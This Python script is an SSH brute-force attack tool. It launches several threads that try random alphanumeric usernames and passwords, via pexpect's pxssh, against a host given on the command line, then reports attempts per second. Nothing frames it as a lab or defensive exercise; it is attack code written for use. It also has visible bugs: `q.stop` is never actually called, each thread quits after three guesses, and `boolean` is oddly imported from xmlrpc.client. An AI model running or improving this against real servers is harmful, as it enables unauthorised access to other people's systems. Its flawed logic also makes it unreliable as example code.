from xmlrpc.client import boolean
from pexpect import pxssh
from pexpect.pxssh import ExceptionPxssh
import random
import string
import sys
import threading
import argparse
from datetime import datetime
import time


def login(host: str,usr: str,passw: str) -> boolean:
    s = pxssh.pxssh()
    try:
        s.login(host, usr, passw)
        print("SSH session login successful")
        s.logout()
        return True
    except ExceptionPxssh:
        # now = datetime.now().strftime(f"%H%M%S")
        # print(f"{now}: SSH session failed on login.")
        return False

def getRandomLogins():
    characters = string.ascii_letters + string.digits
    usr = ''.join(random.choice(characters) for _ in range(random.randint(1,20)))
    passw = ''.join(random.choice(characters) for _ in range(random.randint(1,20)))
    return usr,passw

class bruteforce(threading.Thread):
    def __init__(self,host: str):
        threading.Thread.__init__(self)
        self.host = host
        self.counter = 1
        self.running = False
    def run(self):
        self.running = True
        usr,passw = getRandomLogins()
        self.counter = 1
        while ((not login(self.host,usr,passw)) and (self.running)):
            usr,passw = getRandomLogins()
            self.counter += 1
            if self.counter == 3:
                break
    def stop(self):
        self.running = False
    def __str__(self):
        return "Attempts: "  + str(self.counter)
    
def attack(host: str,n=5,t=10):
    p = [bruteforce(host) for _ in range(n)]
    counter = 0
    start = datetime.now()
    print("Starting...")
    for q in p:
        q.start()

    time.sleep(t)

    for q in p:
        q.stop
        counter += q.counter
        print(counter) 

    end = datetime.now()
    delta = (end-start).seconds
    print(f"{counter} attempts in {delta} seconds")

if __name__ == '__main__':
    attack(sys.argv[1])